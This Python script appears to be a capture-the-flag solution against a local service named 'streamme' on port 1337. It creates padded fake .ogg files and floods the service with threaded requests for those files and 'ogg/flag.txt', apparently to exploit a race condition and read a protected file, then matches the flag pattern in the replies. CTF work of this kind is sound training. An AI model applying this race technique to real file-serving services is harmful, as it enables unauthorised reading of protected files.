import socket
import sys
import os
import re
import time
import _thread
import threading
import signal

def startServer():
	return 0
	serverStartPid = os.fork()
	if serverStartPid == 0:
		while True:
			newpid = os.fork()
			if newpid == 0:
				os.execv('./streamme', ['streamme'])
			else:
				os.waitpid(newpid, 0)
	return serverStartPid

def connectToServer():
	print('connecting to server')
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('127.0.0.1', 1337))
	return sock

def createFile(number):
	filename = 'ogg/'+ str(number) +'.ogg'
	with(open(filename, 'w+')) as f:
		f.write('Ogg')
		f.seek(number * 1024 - 1)
		f.write("\0")
	return filename

def checkForFlag(data):
	reg = re.compile("IIS{.*}")
#	reg = re.compile("fool")
	result = reg.search(str(data, 'utf-8'))
	if result:
		print(result.group(0))
		return True
	return False
	
def receive(sock):
	while True:
		data = sock.recv(10000)
#		print(str(data, 'utf-8'))
		if(checkForFlag(data)):
			condition.acquire()
			condition.notify()
			condition.release()
			exit(0)
			return checkForFlag(data)
	
def send(sock, file):
	while True:
		try:	
			time.sleep(0.1)
			print('requesting file ' + file)
			sock.sendall(str.encode(file + '\0'))
		except Exception:
			break

def startThread(sock, filename):
	while True:	
		thread = threading.Thread(target=send, args=(sock, filename, ))
		thread.setDaemon(True)
		thread.start()
		thread.join()
		sock.close()
		sock = connectToServer()

server_start_pid = startServer()
time.sleep(1)
sock = connectToServer()

filename128 = createFile(128)
filename256 = createFile(256)
filename512 = createFile(512)
filename1024 = createFile(1024)
filename2048 = createFile(2048)

thread_receive1 = threading.Thread(target=receive, args=(sock, ))
thread_receive1.setDaemon(True)
thread_receive1.start()
thread_receive2 = threading.Thread(target=receive, args=(sock, ))
thread_receive2.setDaemon(True)
thread_receive2.start()

thread_send128 = threading.Thread(target=startThread, args=(sock, filename128, ))
thread_send128.setDaemon(True)
thread_send128.start()
thread_send256 = threading.Thread(target=startThread, args=(sock, filename256, ))
thread_send256.setDaemon(True)
thread_send256.start()
thread_send512 = threading.Thread(target=startThread, args=(sock, filename512, ))
thread_send512.setDaemon(True)
thread_send512.start()
thread_send1024 = threading.Thread(target=startThread, args=(sock, filename1024, ))
thread_send1024.setDaemon(True)
thread_send1024.start()
thread_send2048 = threading.Thread(target=startThread, args=(sock, filename2048, ))
thread_send2048.setDaemon(True)
thread_send2048.start()
thread_sendflag = threading.Thread(target=startThread, args=(sock, 'ogg/flag.txt', ))
thread_sendflag.setDaemon(True)
thread_sendflag.start()



condition = threading.Condition()
condition.acquire()
condition.wait()
condition.release()

print('got the flag')
os.kill(server_start_pid, signal.SIGTERM)
exit(0)

